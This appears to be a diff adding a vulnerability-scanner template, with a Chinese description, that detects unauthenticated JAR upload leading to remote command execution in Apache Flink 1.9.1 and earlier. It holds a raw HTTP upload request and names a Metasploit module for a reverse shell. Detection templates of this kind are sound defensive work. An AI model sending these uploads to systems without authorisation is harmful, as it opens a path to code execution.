@@ -1,0 +1,44 @@
+id: apache-flink-unauth-rce
+
+info:
+  name: Apache Flink 1.9.1 - 远程命令执行
+  author: pikpikcu
+  severity: critical
+  description: Flink 是一个开源的分布式流式处理框架(大数据),Apache Flink <= 1.9.1 可上传恶意JAR包,导致任意命令执行,反弹shell(use exploit/multi/http/apache_flink_jar_upload_exec).
+  remediation: 更新官方补丁或更新最新版本.
+  reference:
+    - https://github.com/LandGrey/flink-unauth-rce
+  tags: flink
+  metadata:
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /jars/upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
+
+        --8ce4b16b22b58894aa86c421e8759df3
+        Content-Disposition: form-data; name="jarfile";filename="pocvkey.jar"
+        Content-Type:application/octet-stream
+
+          {{randstr}}
+        --8ce4b16b22b58894aa86c421e8759df3--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: word
+        words:
+          - "success"
+          - "_pocvkey.jar"
+        part: body
+        condition: and
+      - type: status
+        status:
+          - 200
